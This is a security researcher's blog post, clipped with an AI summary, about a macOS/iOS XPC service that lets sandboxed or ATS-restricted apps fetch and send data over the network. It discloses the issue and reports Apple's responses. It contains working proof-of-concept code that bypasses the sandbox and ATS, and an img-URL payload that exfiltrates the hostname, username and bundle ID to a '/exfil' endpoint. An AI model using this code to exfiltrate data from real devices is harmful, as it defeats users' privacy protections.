---
title: My iOS/macOS App Has No Network. It Knows Someone Who Does
source: https://blog.reversesociety.co/blog/2026/my-ios-macos-app-has-no-network-it-knows-someone-who-does
source_host: blog.reversesociety.co
clip_date: 2026-11-21T04:25:57+08:00
trace_id: 60d8e5e3-7d6e-4837-96d5-dac5f9d58506
content_hash: d07e0dd62ec885443486870fa00f2ba1e9760acb0e86ef97179daa8999c659ee
status: synced
tags:
  - iOS逆向
  - 协议分析
series: null
feed_source: Reverse Society Blog·iOS/macOS
ai_summary: "`nsattributedstringagent`（由 `initWithHTML` 触发、在独立进程中用 WebKit 解析 HTML）的 XPC 入口接受任意调用者，因此，即使是无网络的沙盒应用或受 ATS 限制的应用，也能借它完成双向数据外传。"
ai_summary_style: key-points:weak
images_status:
  total: 2
  succeeded: 2
  failed_urls: []
notion_page_id: 41e75244-d011-81cb-85ae-d6dec6a6524f
ioc: null
---

> 💡 **AI 总结（key-points:weak）**
>
> `nsattributedstringagent`（由 `initWithHTML` 触发、在独立进程中用 WebKit 解析 HTML）的 XPC 入口接受任意调用者，因此，即使是无网络的沙盒应用或受 ATS 限制的应用，也能借它完成双向数据外传。
> 
> - **关键入口：** 服务 `com.apple.textkit.nsattributedstringagent` 属于 `ServiceType = Application`，其 `listener:shouldAcceptNewConnection:` 无条件 `return 1`，没有 `sandbox_check`、签名或 entitlement 校验；该现象在 26.3 与 27.2.1 上均存在。
> - **攻击原理：** `renderHTML:options:extensionTokens:withReply:` 走 `_loadFromHTMLWithOptions:`，WebKit 会解析并下载 `<img src>`、`background-image: url()`、`@import` 等资源，下载结果以 `NSTextAttachment.fileWrapper.regularFileContents` 回传给调用方。
> - **macOS 实测：** 关闭出站连接的沙盒 App 直连失败，但经该服务从 `placecats.com` 拿到了 9,300 字节 JPEG；沙盒配置 `/System/Library/Sandbox/Profiles/nsattributedstringagent.sb` 允许它访问 `nsurlsessiond` 与 `com.apple.WebKit.Networking`/`WebContent`。
> - **外传方向：** 把主机名、用户名、bundle ID 拼进 localhost 的 URL 查询串后，服务端成功收到 `/exfil?host=...&user=...&bundle=...`，证明该通道（数据外传）双向可用；真实 App 的容器内文档、偏好、缓存同样可被读出。
> - **iOS 绕过 ATS：** `initWithServiceName:` 仅是编译期标注 unavailable，可用 `NSClassFromString` + `performSelector` 调用；开启 ATS 后直连 HTTP 被拒，而经 XPC 以明文 HTTP 取回 35,588 字节 JPEG。
> - **厂商结论：** 向 Apple 提交的两份报告均被判定非漏洞：iOS 侧称开发者本就可自行调整 ATS；macOS 侧称网络 entitlement 只是纵深防御、非安全边界，最终列入 2026 年 9 月 Safari/WebKit 更新的额外致谢名单，无 CVE、无赏金。

[](https://blog.reversesociety.co/blog?tag=ios)

[ios](https://blog.reversesociety.co/blog?tag=ios)

[

macos

](https://blog.reversesociety.co/blog?tag=macos)[

xpc

](https://blog.reversesociety.co/blog?tag=xpc)[

sandbox

](https://blog.reversesociety.co/blog?tag=sandbox)[

webkit

](https://blog.reversesociety.co/blog?tag=webkit)[

reverse engineering

](https://blog.reversesociety.co/blog?tag=reverse%20engineering)

## Foreword

A year ago I wrote about [attacking macOS XPC helpers of type Application](https://blog.reversesociety.co/blog/2025/how-to-attack-macos-application-xpc-helpers). That post ends on a script: it walks the frameworks, keeps the services whose `Info.plist` declares `ServiceType = Application`, and prints their bundle ID and entitlements.

I kept running that script. It builds a list of processes I am allowed to talk to using XPC from a sandboxed app on macOS, and then I read them one by one.

This is what came out of one of those lines:

```swift
Service found: /System/Library/PrivateFrameworks/UIFoundation.framework/Versions/A/XPCServices/nsattributedstringagent.xpc
  Bundle ID: com.apple.textkit.nsattributedstringagent
  Process is running
```

`nsattributedstringagent` is the process behind `[NSAttributedString initWithHTML:...]`. Every app that asks Cocoa or UIKit to turn HTML into styled text ends up here. It parses the HTML with WebKit, in its own process.

## The gate

Before anything else I check the one method that decides who gets in. The service implements `NSXPCListenerDelegate`, so I open the binary in Binary Ninja and read `listener:shouldAcceptNewConnection:`.

```c
// -[_NSAttributedStringAgentService listener:shouldAcceptNewConnection:]

id interface = [NSXPCInterface interfaceWithProtocol:
    @protocol(_NSAttributedStringAgentProtocol)];

[interface setClasses:optionClasses
          forSelector:@"renderHTML:options:extensionTokens:withReply:"
        argumentIndex:1 ofReply:NO];
// ... more setClasses calls ...

[newConnection setExportedInterface:interface];
[newConnection setExportedObject:[_NSAttributedStringAgent new]];
[newConnection resume];

return 1;
```

`return 1`, which for a `BOOL` is `return YES`. There is no other path. No `sandbox_check`, no signing information, no entitlement lookup. Every caller is accepted.

I ran these tests on 26.3. The gate reads the same on the build I am writing from, macOS 27.2.1, so it is still open today.

> Note: Application type services are reachable by design. What matters is what the protocol allows once the connection is up.

## The method

The protocol exposes a handful of selectors. This one does the rendering:

```objc
- (void)renderHTML:(NSData *)html
           options:(NSDictionary *)options
   extensionTokens:(NSArray *)tokens
         withReply:(void (^)(NSDictionary *, NSAttributedString *, NSError *))reply;
```

Inside, the service loads WebKit and calls `_loadFromHTMLWithOptions:contentLoader:completionHandler:`. WebKit parses my HTML the way a browser would, which means it resolves and downloads what the document points at: `<img src>`, `<link href>`, `background-image: url()`, `@import url()`.

The downloaded bytes come back to me as `NSTextAttachment` objects inside the `NSAttributedString` reply:

```objc
NSData *imageData = attachment.fileWrapper.regularFileContents;
```

So I hand the service a URL as markup, and it hands me back the response body. The request leaves from the service process, with the service network context and the service sandbox profile. Mine is never consulted.

On macOS that profile ships in the clear, at `/System/Library/Sandbox/Profiles/nsattributedstringagent.sb`:

```scheme
(allow mach-lookup
    (global-name "com.apple.coreservices.launchservicesd")
    (global-name "com.apple.nsurlsessiond")
    ...
    (xpc-service-name
        "com.apple.WebKit.Networking"
        "com.apple.WebKit.WebContent"
        ...
    )
)
```

`nsurlsessiond` is the networking daemon, and the two WebKit entries are the processes that do the fetching. The service needs all three to render a remote image.

![A sandboxed caller is refused when it asks for the network itself, and served when the service fetches the same URL for it](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/35ef5d1292c4cda7.svg)

## Test one: macOS, a sandboxed app with no network

I built a plain Xcode app, App Sandbox on, and left the Outgoing Connections box unchecked. The app has zero network access.

Direct calls behave as they should:

```objc
// blocked by the sandbox
// error: A server with the specified hostname could not be found.
[[NSURLSession sharedSession] dataTaskWithURL:
    [NSURL URLWithString:@"https://placecats.com/200/200"] ...];
```

Then the same URL through the service:

```objc
NSXPCConnection *conn = [[NSXPCConnection alloc]
    initWithServiceName:@"com.apple.textkit.nsattributedstringagent"];
conn.remoteObjectInterface = [NSXPCInterface
    interfaceWithProtocol:@protocol(_NSAttributedStringAgentProtocol)];
[conn resume];
id proxy = [conn remoteObjectProxyWithErrorHandler:^(NSError *e) { }];

NSString *html = @"<html><body><img src='https://placecats.com/200/200'></body></html>";
NSDictionary *opts = @{@"DocumentType": @"NSHTML", @"TextEncodingName": @"UTF-8"};
[proxy renderHTML:[html dataUsingEncoding:NSUTF8StringEncoding]
          options:opts extensionTokens:@[]
        withReply:^(NSDictionary *attrs, NSAttributedString *r, NSError *e) { }];
```

9,300 bytes of JPEG came back from `placecats.com`.

That is the download direction. I wanted to know whether user data could go the other way, so I used the part of the URL I fully control, the query string. I pointed it at a local server and put the host name, the user name and the bundle ID in the parameters:

```objc
NSString *payload = [NSString stringWithFormat:@"host=%@&user=%@&bundle=%@",
    [[NSProcessInfo processInfo] hostName], NSUserName(),
    [[NSBundle mainBundle] bundleIdentifier]];
NSString *html = [NSString stringWithFormat:
    @"<html><body><img src='http://localhost:9999/exfil?%@'></body></html>", payload];
```

What the server logged:

```
REQUEST: /exfil?host=Tonys-MacBook-Pro.local&user=tonygo&bundle=tonygo.NSAttributeSBEscape
```

So the channel runs both ways. Anything the sandboxed process can read, it can also send out: the host name and the user name here, and in a real app the documents, the preferences and the caches sitting in its own container. That is exfiltration of user data from a process that is supposed to have no way out.

## Test two: iOS, with App Transport Security enforced

The same service ships inside `UIFoundation` on iOS, which every UIKit app loads. The default iOS sandbox lets an app reach the network, so there was no entitlement to take away this time. The restriction I could put on myself is App Transport Security, declared under `NSAppTransportSecurity` in `Info.plist`. I added it to see whether the service would walk through it:

```xml
<key>NSAppTransportSecurity</key>
<dict>
    <key>NSAllowsArbitraryLoads</key>
    <false/>
</dict>
```

With that key in place my app may only talk HTTPS. Plain HTTP is refused before a packet leaves.

There is one obstacle on iOS. `initWithServiceName:` is annotated as unavailable, so the compiler refuses it:

```
'initWithServiceName:' is unavailable: not available on iOS
```

The annotation is a compile time attribute. The method is still in the runtime, and the runtime takes selectors, not attributes:

```objc
Class cls = NSClassFromString(@"NSXPCConnection");
id conn = [cls alloc];
SEL sel = NSSelectorFromString(@"initWithServiceName:");
conn = [conn performSelector:sel
                  withObject:@"com.apple.textkit.nsattributedstringagent"];
```

The connection resumes, and the rest of the code is identical to the macOS version. On device:

```
[A] Direct NSURLSession (HTTP)
    BLOCKED: The resource could not be loaded because the App Transport
    Security policy requires the use of a secure connection.

[B] Via XPC renderHTML (HTTP)
    35588 bytes (JPEG) over plain HTTP
```

ATS blocks my process. It says nothing about the process I asked to fetch the page.

## What came of it

I filed two reports with Apple Product Security in March 2026, one per platform. Both came back as no vulnerability, for different reasons.

On iOS:

> If a developer has intentionally configured App Transport Security (ATS) for their application, they would not need to employ these techniques to bypass it. Developers who wish to allow insecure connections can simply adjust their ATS settings directly.

My own reading was about the app as a vector rather than the app as an author. An app can declare ATS and still run code nobody audited, an SDK or a dependency three levels down, and that code gets a plain HTTP channel in and out of a process whose policy forbids it. I saw it as one link in a longer chain, and that part stayed a hypothesis: what I reported is the primitive.

On macOS the answer was longer:

> The network client entitlement is a defense in depth control over which processes can originate traffic. It is not one of the boundaries the Apple Security Bounty program treats as a protection around sensitive user data or elevated capabilities.
> 
> It is also worth noting that App Sandbox is not a requirement for macOS applications. The majority of macOS apps are distributed outside the App Store and run without the sandbox at all, so the absence of a network entitlement is not a security boundary users generally rely on for restricting an app's network access.
> 
> Here, the app did not gain access to data, entitlements, or capabilities beyond its own. The traffic flowed through an intermediary that carried its own access, rather than an elevation of the app's privileges. That is why the issue was categorized as a security hardening improvement, which is addressed in the product but is not eligible for a CVE or a bounty award.

The sandbox blocks two things for this app: writing files outside its container, and reaching the network. I thought crossing the second one was enough, whether the app does it itself or a service does it for it.

Apple reads it differently. What counts there is the data or the capability the app gained, and on that count nothing moved. I still read it the other way.

The work landed in the additional recognition list of the [September 2026 Safari and WebKit update](https://support.apple.com/en-gb/128073), updated on September 14, 2026. An acknowledgment, no CVE, no bounty.

## Takeaways

Impact is never the same twice. Understanding what the program treats as research matters more than how much a finding looks like a security flaw from where I stand, and that line is often read best with experience.
![Tony Gorez, Offensive Security Researcher](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/e518e176c75b8261.png)
